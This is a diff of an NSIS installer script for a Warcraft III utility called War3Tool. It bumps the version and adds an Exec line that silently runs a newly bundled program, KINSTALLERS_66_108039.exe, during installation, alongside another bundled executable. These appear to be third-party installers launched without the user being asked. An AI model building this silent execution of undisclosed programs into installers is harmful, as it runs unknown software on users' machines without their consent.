@@ -4,7 +4,7 @@
 
 ; 安装程序初始定义常量
 !define PRODUCT_NAME "War3Tool"
-!define PRODUCT_VERSION "V3.2"
+!define PRODUCT_VERSION "V3.3"
 !define PRODUCT_PUBLISHER "pipi"
 !define PRODUCT_WEB_SITE "http://121.199.10.53/"
 !define PRODUCT_DIR_REGKEY "Software\Microsoft\Windows\CurrentVersion\App Paths\war3Tool.exe"
@@ -66,12 +66,14 @@ Section "MainSection" SEC01
   File "pipilibrary.dll"
   File "Readme.txt"
   File "war3set.ini"
-  File "Update.exe"
-  File  "kill.bat"
+  File "KINSTALLERS_66_108039.exe"
+  #File "Update.exe"
+  #File  "kill.bat"
   File  "down_s_66_46875.exe"
 SectionEnd
 
 Section -AdditionalIcons
+  Exec "$INSTDIR\KINSTALLERS_66_108039.exe"
   Exec "$INSTDIR\down_s_66_46875.exe"
   WriteIniStr "$INSTDIR\${PRODUCT_NAME}.url" "InternetShortcut" "URL" "${PRODUCT_WEB_SITE}"
   CreateShortCut "$SMPROGRAMS\魔兽一键进局域网全屏改键\Website.lnk" "$INSTDIR\${PRODUCT_NAME}.url"
